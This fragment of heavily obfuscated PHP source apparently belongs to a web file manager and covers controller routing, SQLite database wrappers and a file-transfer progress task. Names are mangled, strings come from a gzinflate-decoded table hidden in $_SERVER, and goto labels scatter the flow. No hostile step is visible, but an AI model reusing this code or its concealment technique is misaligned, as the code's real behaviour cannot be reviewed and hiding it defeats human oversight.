return; } $¿Õî‹úğ = $this->pathInfo($êö¡é£Ğ[$áÖ¯ï£«[180]]); $ğéØ•‹ = $¿Õî‹úğ[$áÖ¯ï£«[180]] . $áÖ¯ï£«[12] === $áÖ¯ï£«[212]; $Ú—‹¸€ä = $¿Õî‹úğ[$áÖ¯ï£«[178]] == $áÖ¯ï£«[547]; if ($¿Õî‹úğ[$áÖ¯ï£«[564]] == $áÖ¯ï£«[565]) { $’ŠÕª†‡ = $this->sourceInfo($êö¡é£Ğ[$áÖ¯ï£«[180]]); $¿Õî‹úğ[$áÖ¯ï£«[553]] = $’ŠÕª†‡[$áÖ¯ï£«[553]]; } $ËÒ×ü·’[$áÖ¯ï£«[620]] = array($áÖ¯ï£«[580], $¿Õî‹úğ[$áÖ¯ï£«[553]] . $êö¡é£Ğ[$áÖ¯ï£«[180]] . $áÖ¯ï£«[581]); $¨ÛÂóö = isset($êö¡é£Ğ[$áÖ¯ï£«[1846]]) && in_array($áÖ¯ï£«[547], $êö¡é£Ğ[$áÖ¯ï£«[1846]]); if (!$¨ÛÂóö || !$Ú—‹¸€ä || !$ğéØ•‹ || !$¿Õî‹úğ[$áÖ¯ï£«[455]]) { return; } if (!AuthModel::authCheckRoot($¿Õî‹úğ[$áÖ¯ï£«[455]][$áÖ¯ï£«[456]])) { return; } $Ì‡é™¯„ = $¿Õî‹úğ[$áÖ¯ï£«[538]] . $áÖ¯ï£«[12]; if ($Ì‡é™¯„ == $áÖ¯ï£«[88]) { unset($ËÒ×ü·’[$áÖ¯ï£«[620]]); $ËÒ×ü·’[$áÖ¯ï£«[178]] = self::TYPE_GROUP; return; } $é¿¤Ö½º = Model($áÖ¯ï£«[554])->groupChildrenAll($Ì‡é™¯„); $ÌãààŠè = count($é¿¤Ö½º); if ($ÌãààŠè <= 1) { return; } $½Ôá” = array($áÖ¯ï£«[180] => 0, $áÖ¯ï£«[178] => self::TYPE_GROUP, $áÖ¯ï£«[538] => array($áÖ¯ï£«[7], $é¿¤Ö½º)); $äß¨’ÚÓ = $this->field($áÖ¯ï£«[2159])->where($½Ôá”)->limit($ÌãààŠè)->select(); $ËÒ×ü·’[$áÖ¯ï£«[620]] = array(); foreach ($äß¨’ÚÓ as $Ò½÷Ïºø) { $ËÒ×ü·’[$áÖ¯ï£«[620]][] = array($áÖ¯ï£«[580], $áÖ¯ï£«[563] . $Ò½÷Ïºø[$áÖ¯ï£«[181]] . $áÖ¯ï£«[581]); } $ËÒ×ü·’[$áÖ¯ï£«[620]][] = $áÖ¯ï£«[1985]; } } goto a¯í¬æ¦Áä; aœïŸŠ£¶: define($_SERVER[—ÌÒğš÷][646], $_SERVER[—ÌÒğš÷][647]); $tiyqvmdehn = $_SERVER[—ÌÒğš÷][648]; if (!$tiyqvmdehn) { return; } goto A¼‡–ƒš»½; dò…ˆî¨õ¡: class Controller extends ClassBaseCall { public $in; public $config; public $tpl; public $values; function __construct() { $ˆôõ¸ö =& $_SERVER[—ÌÒğš÷]; global $in, $config; $this->config =& $config; $this->in =& $in; $this->values[$ˆôõ¸ö[6]] =& $config; $this->values[$ˆôõ¸ö[7]] =& $in; $this->tpl = TEMPLATE . MOD . $ˆôõ¸ö[8]; $this->_classObjectID = mt_rand(0, 10000); } public function loadClass($‚¾¬¾¾ù) { if (1 === func_num_args()) { $this->{$‚¾¬¾¾ù} = new $‚¾¬¾¾ù(); } else { $û³Õ”ÙÔ = new ReflectionClass($‚¾¬¾¾ù); $–šûîóŸ = func_get_args(); array_shift($–šûîóŸ); $this->{$‚¾¬¾¾ù} = $û³Õ”ÙÔ->newInstanceArgs($–šûîóŸ); } return $this->{$‚¾¬¾¾ù}; } public function routeBind($·µŸº½ƒ, $ó×Éà‚õ, $œû“Üô§ = 3) { $îË»ß¿ =& $_SERVER[—ÌÒğš÷]; $Ş×÷Öé = $this->in[$îË»ß¿[9]]; $·µŸº½ƒ = str_replace($îË»ß¿[10], $îË»ß¿[11], trim(trim($·µŸº½ƒ, $îË»ß¿[8]), $îË»ß¿[12])); if (!$·µŸº½ƒ || count($Ş×÷Öé) <= $œû“Üô§) { return !1; } $ÉÓŒÍ† = !0; $ÎíÃôš = explode($îË»ß¿[8], $·µŸº½ƒ); for ($¢›ò’— = 0; $¢›ò’— < count($ÎíÃôš); $¢›ò’—++) { if ($ÎíÃôš[$¢›ò’—] != $Ş×÷Öé[$œû“Üô§ + $¢›ò’—]) { $ÉÓŒÍ† = !1; break; } } if (!$ÉÓŒÍ†) { return; } call_user_func_array(array($this, $ó×Éà‚õ), array()); } public function routeArgs($ÇüóëÃµ = 3) { $™ƒÏŞ¼ = $this->in[$_SERVER[—ÌÒğš÷][9]]; if (count($™ƒÏŞ¼) <= $ÇüóëÃµ) { return array(); } $–˜º¶Ê = array(); for ($šĞá¾ÀÒ = $ÇüóëÃµ; $šĞá¾ÀÒ < count($™ƒÏŞ¼); $šĞá¾ÀÒ += 2) { $–˜º¶Ê[$™ƒÏŞ¼[$šĞá¾ÀÒ]] = $™ƒÏŞ¼[$šĞá¾ÀÒ + 1]; $this->in[$™ƒÏŞ¼[$šĞá¾ÀÒ]] = $™ƒÏŞ¼[$šĞá¾ÀÒ + 1]; } return $–˜º¶Ê; } protected function assign($ø³¸Óƒ, $±¨Ÿè‡®) { $this->values[$ø³¸Óƒ] = $±¨Ÿè‡®; } protected function display($¿¿‘«å´) { ob_end_clean(); extract($this->values); require $this->tpl . $¿¿‘«å´; } } class DbSqliteBase extends Db { public function __construct($œ—­¢ˆÔ = '') { $¤‰÷İ®â =& $_SERVER[—ÌÒğš÷]; if (!extension_loaded($¤‰÷İ®â[13])) { think_exception(think_lang($¤‰÷İ®â[14]) . $¤‰÷İ®â[15]); } if (!empty($œ—­¢ˆÔ)) { if (!isset($œ—­¢ˆÔ[$¤‰÷İ®â[16]])) { $œ—­¢ˆÔ[$¤‰÷İ®â[16]] = 438; } $this->config = $œ—­¢ˆÔ; if (empty($this->config[$¤‰÷İ®â[17]])) { $this->config[$¤‰÷İ®â[17]] = array(); } } } public function connect($Ï®éÆ¼£ = '', $•²ò×¯ª = 0) { $çÀš¾ù½ =& $_SERVER[—ÌÒğš÷]; if (!isset($this->linkID[$•²ò×¯ª])) { if (empty($Ï®éÆ¼£)) { $Ï®éÆ¼£ = $this->config; } $×¹ß÷åª = !empty($Ï®éÆ¼£[$çÀš¾ù½[17]][$çÀš¾ù½[18]]) ? $Ï®éÆ¼£[$çÀš¾ù½[17]][$çÀš¾ù½[18]] : $this->pconnect; $èñıíª = $×¹ß÷åª ? $çÀš¾ù½[19] : $çÀš¾ù½[20]; $this->linkID[$•²ò×¯ª] = $èñıíª($Ï®éÆ¼£[$çÀš¾ù½[21]], $Ï®éÆ¼£[$çÀš¾ù½[16]]); if (!$this->linkID[$•²ò×¯ª]) { think_exception(sqlite_error_string()); } $this->connected = !0; @sqlite_busy_timeout($this->linkID[$•²ò×¯ª], 30000); if (1 != think_config($çÀš¾ù½[22])) { unset($this->config); } } return $this->linkID[$•²ò×¯ª]; } public function free() { $this->queryID = null; } public function query($µ¥‹çíö) { $şïÔä¦™ =& $_SERVER[—ÌÒğš÷]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $µ¥‹çíö; if ($this->queryID) { $this->free(); } think_action_status($şïÔä¦™[23], 1); think_status($şïÔä¦™[24]); $this->queryID = sqlite_query($this->_linkID, $µ¥‹çíö); $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = sqlite_num_rows($this->queryID); $Üê†Ø„¦ = $this->getAll(); return $Üê†Ø„¦; } } public function execute($¹µÊÃ) { $…ˆÔ£ =& $_SERVER[—ÌÒğš÷]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $¹µÊÃ; if ($this->queryID) { $this->free(); } think_action_status($…ˆÔ£[25], 1); think_status($…ˆÔ£[24]); $‹¿³ò¿„ = sqlite_exec($this->_linkID, $¹µÊÃ); $this->debug(); if (!1 === $‹¿³ò¿„) { $this->error(); return !1; } else { $this->numRows = sqlite_changes($this->_linkID); $this->lastInsID = sqlite_last_insert_rowid($this->_linkID); return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { sqlite_query($this->_linkID, $_SERVER[—ÌÒğš÷][26]); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $à ¬†•§ = sqlite_query($this->_linkID, $_SERVER[—ÌÒğš÷][27]); if (!$à ¬†•§) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } public function rollback() { if ($this->transTimes > 0) { $¨‘æÉÇœ = sqlite_query($this->_linkID, $_SERVER[—ÌÒğš÷][28]); if (!$¨‘æÉÇœ) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } private function getAll() { $ë”é¿ğ = array(); if ($this->numRows > 0) { for ($¡ƒÁüŠ† = 0; $¡ƒÁüŠ† < $this->numRows; $¡ƒÁüŠ†++) { $ë”é¿ğ[$¡ƒÁüŠ†] = sqlite_fetch_array($this->queryID, SQLITE_ASSOC); } sqlite_seek($this->queryID, 0); } return $ë”é¿ğ; } public function getFields($î„ÓÊå‹) { $éôƒäîª =& $_SERVER[—ÌÒğš÷]; $Ôªß“Í® = $this->query($éôƒäîª[29] . $î„ÓÊå‹ . $éôƒäîª[30]); $˜ ôÖâÖ = array(); if ($Ôªß“Í®) { foreach ($Ôªß“Í® as $»™§İá³ => $¡áè€öÂ) { $˜ ôÖâÖ[$¡áè€öÂ[$éôƒäîª[31]]] = array($éôƒäîª[32] => $¡áè€öÂ[$éôƒäîª[31]], $éôƒäîª[33] => $¡áè€öÂ[$éôƒäîª[34]], $éôƒäîª[35] => (bool) ($¡áè€öÂ[$éôƒäîª[36]] === $éôƒäîª[12]), $éôƒäîª[37] => $¡áè€öÂ[$éôƒäîª[38]], $éôƒäîª[39] => strtolower($¡áè€öÂ[$éôƒäîª[40]]) == $éôƒäîª[41], $éôƒäîª[42] => strtolower($¡áè€öÂ[$éôƒäîª[43]]) == $éôƒäîª[44]); } } return $˜ ôÖâÖ; } public function getTables($¨·Üï¼¬ = '') { $¨ÃÂáü© =& $_SERVER[—ÌÒğš÷]; $¾¥Ï±‹» = $this->query($¨ÃÂáü©[45] . $¨ÃÂáü©[46] . $¨ÃÂáü©[47]); $ó ¬â™ = array(); foreach ($¾¥Ï±‹» as $ßÛ«Ôä‡ => $ğÓá¾ªğ) { $ó ¬â™[$ßÛ«Ôä‡] = current($ğÓá¾ªğ); } return $ó ¬â™; } public function close() { if ($this->_linkID) { sqlite_close($this->_linkID); } $this->_linkID = null; } public function error() { $äÕÙğÆ¤ =& $_SERVER[—ÌÒğš÷]; $„ Ø§îş = sqlite_last_error($this->_linkID); $this->error = $„ Ø§îş . $äÕÙğÆ¤[4] . sqlite_error_string($„ Ø§îş); if ($äÕÙğÆ¤[12] != $this->queryStr) { $this->error .= LNG($äÕÙğÆ¤[48]) . $this->queryStr; } think_trace($this->error, $äÕÙğÆ¤[12], $äÕÙğÆ¤[49]); return $this->error; } public function escapeString($ƒŞé®²´) { return sqlite_escape_string($ƒŞé®²´); } public function parseLimit($‚­ÎùÜõ) { $–ı¸Üó’ =& $_SERVER[—ÌÒğš÷]; $ÎÑ¼¼¾ = $–ı¸Üó’[12]; if (!empty($‚­ÎùÜõ)) { $‚­ÎùÜõ = explode($–ı¸Üó’[50], $‚­ÎùÜõ); if (count($‚­ÎùÜõ) > 1) { $ÎÑ¼¼¾ .= $–ı¸Üó’[51] . $‚­ÎùÜõ[1] . $–ı¸Üó’[52] . $‚­ÎùÜõ[0] . $–ı¸Üó’[53]; } else { $ÎÑ¼¼¾ .= $–ı¸Üó’[51] . $‚­ÎùÜõ[0] . $–ı¸Üó’[53]; } } return $ÎÑ¼¼¾; } } class DbSqlite3Base extends Db { public function __construct($è¬²ØË¶ = '') { $³¡ÀÊ =& $_SERVER[—ÌÒğš÷]; if (!class_exists($³¡ÀÊ[54])) { think_exception(think_lang($³¡ÀÊ[14]) . $³¡ÀÊ[55]); } if (!empty($è¬²ØË¶)) { if (!isset($è¬²ØË¶[$³¡ÀÊ[16]])) { $è¬²ØË¶[$³¡ÀÊ[16]] = 438; } $this->config = $è¬²ØË¶; if (empty($this->config[$³¡ÀÊ[17]])) { $this->config[$³¡ÀÊ[17]] = array(); } } } public function connect($âšşºÃÌ = '', $ÖñĞ÷‚… = 0) { $›Æ­ï¦ï =& $_SERVER[—ÌÒğš÷]; if (!isset($this->linkID[$ÖñĞ÷‚…])) { if (empty($âšşºÃÌ)) { $âšşºÃÌ = $this->config; } $this->linkID[$ÖñĞ÷‚…] = new SQLite3($âšşºÃÌ[$›Æ­ï¦ï[21]]); if (!$this->linkID[$ÖñĞ÷‚…]) { think_exception($this->linkID[$ÖñĞ÷‚…]->lastErrorMsg()); } $this->connected = !0; @$this->linkID[$ÖñĞ÷‚…]->busyTimeout(30000); if (1 != think_config($›Æ­ï¦ï[22])) { unset($this->config); } } return $this->linkID[$ÖñĞ÷‚…]; } public function free() { $this->queryID = null; } public function query($¦ôÔ¨’ô) { $ö¼¼…Æ¤ =& $_SERVER[—ÌÒğš÷]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $¦ôÔ¨’ô; if ($this->queryID) { $this->free(); } think_action_status($ö¼¼…Æ¤[23], 1); think_status($ö¼¼…Æ¤[24]); $this->queryID = $this->_linkID->query($¦ôÔ¨’ô); $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $Û‘ÂæÉ = $this->getAll(); $this->numRows = count($Û‘ÂæÉ); return $Û‘ÂæÉ; } } public function execute($ôø³‹öü) { $â»™›³ =& $_SERVER[—ÌÒğš÷]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $ôø³‹öü; if ($this->queryID) { $this->free(); } think_action_status($â»™›³[25], 1); think_status($â»™›³[24]); $Ÿâ§æîÊ = $this->_linkID->exec($ôø³‹öü); $this->debug(); if (!1 === $Ÿâ§æîÊ) { $this->error(); return !1; } else { $this->numRows = $this->_linkID->changes(); $this->lastInsID = $this->_linkID->lastInsertRowID(); return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { $this->_linkID->query($_SERVER[—ÌÒğš÷][26]); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $´ƒİ‚Èë = $this->_linkID->query($_SERVER[—ÌÒğš÷][27]); if (!$´ƒİ‚Èë) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } public function rollback() { if ($this->transTimes > 0) { $ÓşéŸü = $this->_linkID->query($_SERVER[—ÌÒğš÷][28]); if (!$ÓşéŸü) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } private function getAll() { $ê½±ìñ› = array(); while ($½â®Ï² = $this->queryID->fetchArray(SQLITE3_ASSOC)) { $ê½±ìñ›[] = $½â®Ï²; } $this->queryID->reset(); return $ê½±ìñ›; } public function getFields($êÔóı®š) { $±‚®‰ =& $_SERVER[—ÌÒğš÷]; $Ù¡Á‘œ = $this->query($±‚®‰[29] . $êÔóı®š . $±‚®‰[30]); $úœ ³ª² = array(); if ($Ù¡Á‘œ) { foreach ($Ù¡Á‘œ as $·™Æ¤± => $™ÆıÜ¬Ü) { $úœ ³ª²[$™ÆıÜ¬Ü[$±‚®‰[32]]] = array($±‚®‰[32] => $™ÆıÜ¬Ü[$±‚®‰[32]], $±‚®‰[33] => $™ÆıÜ¬Ü[$±‚®‰[33]], $±‚®‰[35] => (bool) ($™ÆıÜ¬Ü[$±‚®‰[35]] === $±‚®‰[12]), $±‚®‰[37] => $™ÆıÜ¬Ü[$±‚®‰[56]], $±‚®‰[39] => (bool) $™ÆıÜ¬Ü[$±‚®‰[57]], $±‚®‰[42] => (bool) $™ÆıÜ¬Ü[$±‚®‰[57]]); } } return $úœ ³ª²; } public function getTables($ù±é±¡µ = '') { $¤Ğö‚– =& $_SERVER[—ÌÒğš÷]; $Ï¹¶ªÇ = $this->query($¤Ğö‚–[45] . $¤Ğö‚–[46] . $¤Ğö‚–[47]); $Úï°§Ïä = array(); foreach ($Ï¹¶ªÇ as $”ö¦¦Ìˆ => $‚†©è©ï) { $Úï°§Ïä[$”ö¦¦Ìˆ] = current($‚†©è©ï); } return $Úï°§Ïä; } public function close() { if ($this->_linkID) { $this->_linkID->close(); } $this->_linkID = null; } public function error() { $’ÚæÉ¬• =& $_SERVER[—ÌÒğš÷]; $this->error = $this->_linkID->lastErrorMsg(); if ($’ÚæÉ¬•[12] != $this->queryStr) { $this->error .= LNG($’ÚæÉ¬•[48]) . $this->queryStr; } think_trace($this->error, $’ÚæÉ¬•[12], $’ÚæÉ¬•[49]); return $this->error; } public function escapeString($Öğ‘Ÿß) { $Ì¨¶‰ÀÅ =& $_SERVER[—ÌÒğš÷]; if ($this->_linkID) { return $this->_linkID->escapeString($Öğ‘Ÿß); } return str_ireplace($Ì¨¶‰ÀÅ[58], $Ì¨¶‰ÀÅ[59], $Öğ‘Ÿß); } public function parseLimit($½°ñ¶¿‰) { $³ŸÕ»° =& $_SERVER[—ÌÒğš÷]; $ß×¹Î½‹ = $³ŸÕ»°[12]; if (!empty($½°ñ¶¿‰)) { $½°ñ¶¿‰ = explode($³ŸÕ»°[50], $½°ñ¶¿‰); if (count($½°ñ¶¿‰) > 1) { $ß×¹Î½‹ .= $³ŸÕ»°[51] . $½°ñ¶¿‰[1] . $³ŸÕ»°[52] . $½°ñ¶¿‰[0] . $³ŸÕ»°[53]; } else { $ß×¹Î½‹ .= $³ŸÕ»°[51] . $½°ñ¶¿‰[0] . $³ŸÕ»°[53]; } } return $ß×¹Î½‹; } } goto EôÓùËÔ ±; DŒù‘á—Ø: define($_SERVER[—ÌÒğš÷][0], $_SERVER[—ÌÒğš÷][1]); $_SERVER[­Ú¶×µ] = explode($_SERVER[—ÌÒğš÷][2], gzinflate(substr($_SERVER[—ÌÒğš÷][3], 10, -8))); function binCheckEq($ÍÂ²Æçà, $´Š¥¥´è) { return $ÍÂ²Æçà == $´Š¥¥´è; } goto e¿Ä¬¦âÎ; E¹´ï‡Ûº: class TaskFileTransfer extends Task { protected function startAfter() { $²¥²ËÇá =& $_SERVER[—ÌÒğš÷]; $°ÛÇ¢şš =& $this->task; $this->sourceCopyFolder = !1; Hook::bind($²¥²ËÇá[1718], array($this, $²¥²ËÇá[1719])); Hook::bind($²¥²ËÇá[1267], array($this, $²¥²ËÇá[1720])); Hook::bind($²¥²ËÇá[1721], array($this, $²¥²ËÇá[1722])); Hook::bind($²¥²ËÇá[636], array($this, $²¥²ËÇá[1723])); Hook::bind($²¥²ËÇá[637], array($this, $²¥²ËÇá[1724])); Hook::bind($²¥²ËÇá[644], array($this, $²¥²ËÇá[1725])); Hook::bind($²¥²ËÇá[645], array($this, $²¥²ËÇá[1726])); Hook::bind($²¥²ËÇá[639], array($this, $²¥²ËÇá[1727])); Hook::bind($²¥²ËÇá[642], array($this, $²¥²ËÇá[1728])); Hook::bind($²¥²ËÇá[605], array($this, $²¥²ËÇá[1729])); Hook::bind($²¥²ËÇá[602], array($this, $²¥²ËÇá[1729])); Hook::bind($²¥²ËÇá[607], array($this, $²¥²ËÇá[1729])); Hook::bind($²¥²ËÇá[609], array($this, $²¥²ËÇá[1729])); Hook::bind($²¥²ËÇá[611], array($this, $²¥²ËÇá[1729])); Hook::bind($²¥²ËÇá[1730], array($this, $²¥²ËÇá[1731])); Hook::bind($²¥²ËÇá[627], array($this, $²¥²ËÇá[1732])); $this->sourceModelCopyFlag = !1; Hook::bind($²¥²ËÇá[1733], array($this, $²¥²ËÇá[1734])); Hook::bind($²¥²ËÇá[1735], array($this, $²¥²ËÇá[1736])); Hook::bind($²¥²ËÇá[1737], array($this, $²¥²ËÇá[1738])); $°ÛÇ¢şš[$²¥²ËÇá[1739]] = LNG($²¥²ËÇá[1740]); $°ÛÇ¢şš[$²¥²ËÇá[1741]] = 0; $°ÛÇ¢şš[$²¥²ËÇá[1742]] = 0; $°ÛÇ¢şš[$²¥²ËÇá[1108]] = $²¥²ËÇá[12]; $°ÛÇ¢şš[$²¥²ËÇá[1743]] = $²¥²ËÇá[12]; $°ÛÇ¢şš[$²¥²ËÇá[1744]] = 0; $°ÛÇ¢şš[$²¥²ËÇá[1745]] = 0; $°ÛÇ¢şš[$²¥²ËÇá[1746]] = 0; if (!$°ÛÇ¢şš[$²¥²ËÇá[1585]]) { $°ÛÇ¢şš[$²¥²ËÇá[1585]] = LNG($²¥²ËÇá[1747]); } } protected function endAfter() { $ÛÊ¶ŒÆ =& $_SERVER[—ÌÒğš÷]; Hook::unbind($ÛÊ¶ŒÆ[1718], array($this, $ÛÊ¶ŒÆ[1719])); Hook::unbind($ÛÊ¶ŒÆ[1267], array($this, $ÛÊ¶ŒÆ[1720])); Hook::unbind($ÛÊ¶ŒÆ[1721], array($this, $ÛÊ¶ŒÆ[1722])); Hook::unbind($ÛÊ¶ŒÆ[636], array($this, $ÛÊ¶ŒÆ[1723])); Hook::unbind($ÛÊ¶ŒÆ[637], array($this, $ÛÊ¶ŒÆ[1724])); Hook::unbind($ÛÊ¶ŒÆ[644], array($this, $ÛÊ¶ŒÆ[1725])); Hook::unbind($ÛÊ¶ŒÆ[645], array($this, $ÛÊ¶ŒÆ[1726])); Hook::unbind($ÛÊ¶ŒÆ[639], array($this, $ÛÊ¶ŒÆ[1727])); Hook::unbind($ÛÊ¶ŒÆ[642], array($this, $ÛÊ¶ŒÆ[1728])); Hook::unbind($ÛÊ¶ŒÆ[605], array($this, $ÛÊ¶ŒÆ[1729])); Hook::unbind($ÛÊ¶ŒÆ[602], array($this, $ÛÊ¶ŒÆ[1729])); Hook::unbind($ÛÊ¶ŒÆ[607], array($this, $ÛÊ¶ŒÆ[1729])); Hook::unbind($ÛÊ¶ŒÆ[609], array($this, $ÛÊ¶ŒÆ[1729])); Hook::unbind($ÛÊ¶ŒÆ[611], array($this, $ÛÊ¶ŒÆ[1729])); Hook::unbind($ÛÊ¶ŒÆ[1730], array($this, $ÛÊ¶ŒÆ[1731])); Hook::unbind($ÛÊ¶ŒÆ[627], array($this, $ÛÊ¶ŒÆ[1732])); Hook::unbind($ÛÊ¶ŒÆ[1733], array($this, $ÛÊ¶ŒÆ[1734])); Hook::unbind($ÛÊ¶ŒÆ[1735], array($this, $ÛÊ¶ŒÆ[1736])); Hook::unbind($ÛÊ¶ŒÆ[1737], array($this, $ÛÊ¶ŒÆ[1738])); } public function copyMoveStart($ÒÈÛÑäÂ, $Å”ÇïÚû, $†×Õ°ê, $÷²¨°á§) { $šÉòŸ‰ç =& $_SERVER[—ÌÒğš÷]; self::log($šÉòŸ‰ç[1748] . $Å”ÇïÚû . $šÉòŸ‰ç[70] . $÷²¨°á§); $³¤‡——À = rtrim(TEMP_FILES, $šÉòŸ‰ç[8]); if (substr($Å”ÇïÚû, 0, strlen($³¤‡——À)) == $³¤‡——À) { return; } if (substr($÷²¨°á§, 0, strlen($³¤‡——À)) == $³¤‡——À) { return; } $««ø†™ =& $this->task; $««ø†™[$šÉòŸ‰ç[1749]] = KodIO::transferType($ÒÈÛÑäÂ, $†×Õ°ê); $this->update(); } public function updateAfter() { $ùï›ñÑ³ =& $_SERVER[—ÌÒğš÷]; $Œ²Ü×œ¥ =& $this->task; if (!$Œ²Ü×œ¥[$ùï›ñÑ³[799]]) { return; } if ($this->sourceModelCopyFlag) { return; } if ($Œ²Ü×œ¥[$ùï›ñÑ³[1749]] == $ùï›ñÑ³[1359]) { return; } self::updateTask($Œ²Ü×œ¥); } private static function updateTask(&$´æ¾»’Ç) { $„‹ş‘¦ =& $_SERVER[—ÌÒğš÷]; if ($´æ¾»’Ç[$„‹ş‘¦[1749]] == $„‹ş‘¦[1238] || $´æ¾»’Ç[$„‹ş‘¦[1749]] == $„‹ş‘¦[107]) { if ($´æ¾»’Ç[$„‹ş‘¦[1743]]) { $´æ¾»’Ç[$„‹ş‘¦[1746]] = $´æ¾»’Ç[$„‹ş‘¦[1745]] + $´æ¾»’Ç[$„‹ş‘¦[1742]]; } } else { if ($´æ¾»’Ç[$„‹ş‘¦[1749]] == $„‹ş‘¦[1360]) { if ($´æ¾»’Ç[$„‹ş‘¦[1743]] == $„‹ş‘¦[1238]) { $´æ¾»’Ç[$„‹ş‘¦[1746]] = $´æ¾»’Ç[$„‹ş‘¦[1745]] + $´æ¾»’Ç[$„‹ş‘¦[1742]] * 0.5; } else { if ($´æ¾»’Ç[$„‹ş‘¦[1743]] == $„‹ş‘¦[107]) { $´æ¾»’Ç[$„‹ş‘¦[1746]] = $´æ¾»’Ç[$„‹ş‘¦[1745]] + $´æ¾»’Ç[$„‹ş‘¦[1741]] * 0.5 + $´æ¾»’Ç[$„‹ş‘¦[1742]] * 0.5; } } } } $´æ¾»’Ç[$„‹ş‘¦[1690]] = $´æ¾»’Ç[$„‹ş‘¦[1746]] / $´æ¾»’Ç[$„‹ş‘¦[799]]; if ($´æ¾»’Ç[$„‹ş‘¦[1690]] > 0) { $×—Ù÷ëÖ = timeFloat() - $´æ¾»’Ç[$„‹ş‘¦[1692]] - $´æ¾»’Ç[$„‹ş‘¦[1695]]; $´æ¾»’Ç[$„‹ş‘¦[1696]] = $×—Ù÷ëÖ * (1 - $´æ¾»’Ç[$„‹ş‘¦[1690]]) / $´æ¾»’Ç[$„‹ş‘¦[1690]]; } } public function addPath($¨ã¦ÛÀ) { $êÀ½´æ² =& $_SERVER[—ÌÒğš÷]; if (!$¨ã¦ÛÀ) { return; } $Æ»¯™Æœ =& $this->task; $¬—Õ¢¦Ô = IO::infoWithChildren($¨ã¦ÛÀ); $À´ıŞİ = $Æ»¯™Æœ[$êÀ½´æ²[1750]] ? $Æ»¯™Æœ[$êÀ½´æ²[1750]][$êÀ½´æ²[1751]] : 0; $Æ»¯™Æœ[$êÀ½´æ²[1750]] = array($êÀ½´æ²[1751] => $À´ıŞİ + 1, $êÀ½´æ²[462] => $¬—Õ¢¦Ô[$êÀ½´æ²[32]], $êÀ½´æ²[84] => $¬—Õ¢¦Ô[$êÀ½´æ²[84]], $êÀ½´æ²[551] => $¬—Õ¢¦Ô[$êÀ½´æ²[551]] ? $¬—Õ¢¦Ô[$êÀ½´æ²[551]] : $¬—Õ¢¦Ô[$êÀ½´æ²[84]]); if ($¬—Õ¢¦Ô[$êÀ½´æ²[33]] == $êÀ½´æ²[214]) { $Æ»¯™Æœ[$êÀ½´æ²[822]] += 1; } else { $Æ»¯™Æœ[$êÀ½´æ²[822]] += $¬—Õ¢¦Ô[$êÀ½´æ²[79]][$êÀ½´æ²[77]]; if ($¬—Õ¢¦Ô[$êÀ½´æ²[181]]) { $Æ»¯™Æœ[$êÀ½´æ²[822]] += $¬—Õ¢¦Ô[$êÀ½´æ²[79]][$êÀ½´æ²[78]] + 1; } } $Æ»¯™Æœ[$êÀ½´æ²[799]] += $¬—Õ¢¦Ô[$êÀ½´æ²[76]]; $this->update(); } public function sourceCopyFolderStart() { $this->sourceCopyFolder = !0; } public function sourceCopyFolderEnd() { $this->sourceCopyFolder = !1; } public function sourceAddHashStart($¹ÆÊ²Æ³) { } public function sourceAddHashEnd($­‘²•«) { } public function sourceAddFileStart($ìØÀşÔø) { $ôÆ·¿›Ó =& $_SERVER[—ÌÒğš÷]; $ØöËç‘¹ =& $this->task; $ØöËç‘¹[$ôÆ·¿›Ó[1741]] = $ìØÀşÔø[$ôÆ·¿›Ó[76]]; $ØöËç‘¹[$ôÆ·¿›Ó[1739]] = $ìØÀşÔø[$ôÆ·¿›Ó[32]]; $ØöËç‘¹[$ôÆ·¿›Ó[1108]] = $ìØÀşÔø[$ôÆ·¿›Ó[32]]; $ØöËç‘¹[$ôÆ·¿›Ó[1752]] = $ìØÀşÔø[$ôÆ·¿›Ó[84]]; $this->update(); } public function sourceAddFileEnd($ø£‚Ô“Š) { $Ô·„¤‚Ò =& $_SERVER[—ÌÒğš÷]; $ÜÀ¶ÌïĞ =& $this->task; $ÜÀ¶ÌïĞ[$Ô·„¤‚Ò[1746]] += $ø£‚Ô“Š[$Ô·„¤‚Ò[76]]; $ÜÀ¶ÌïĞ[$Ô·„¤‚Ò[1752]] = $ø£‚Ô“Š[$Ô·„¤‚Ò[84]]; $this->update(1); } public function copyFileStart($®•Ä‚, $ÜğÜ‰’Ş, $…ã÷“, $ÂÀ¢²Ê, $×·¹¡©Á, $ ›õæà ) { $ÛŒ¥·åß =& $_SERVER[—ÌÒğš÷]; $Ì€âÚ‰ã = $×·¹¡©Á; if ($Ì€âÚ‰ã == $GLOBALS[$ÛŒ¥·åß[1753]]) { $Ì€âÚ‰ã = $GLOBALS[$ÛŒ¥·åß[1754]]; } $GLOBALS[$ÛŒ¥·åß[1754]] = $×·¹¡©Á; $GLOBALS[$ÛŒ¥·åß[1753]] = $ ›õæà ; $‡ÖÚÜ„ =& $this->task; $‡ÖÚÜ„[$ÛŒ¥·åß[1739]] = $Ì€âÚ‰ã; $‡ÖÚÜ„[$ÛŒ¥·åß[1741]] = (int) $®•Ä‚->size($ÜğÜ‰’Ş); $‡ÖÚÜ„[$ÛŒ¥·åß[1742]] = 0; $‡ÖÚÜ„[$ÛŒ¥·åß[1108]] = $ÛŒ¥·åß[12]; $‡ÖÚÜ„[$ÛŒ¥·åß[1743]] = $ÛŒ¥·åß[12]; $‡ÖÚÜ„[$ÛŒ¥·åß[1744]] = 0; $†Á³òå = $‡ÖÚÜ„[$ÛŒ¥·åß[1741]] > 1024 * 1024 * 10 ? !0 : !1; Cache::remove($‡ÖÚÜ„[$ÛŒ¥·åß[443]] . $ÛŒ¥·åß[1755]); if ($†Á³òå && 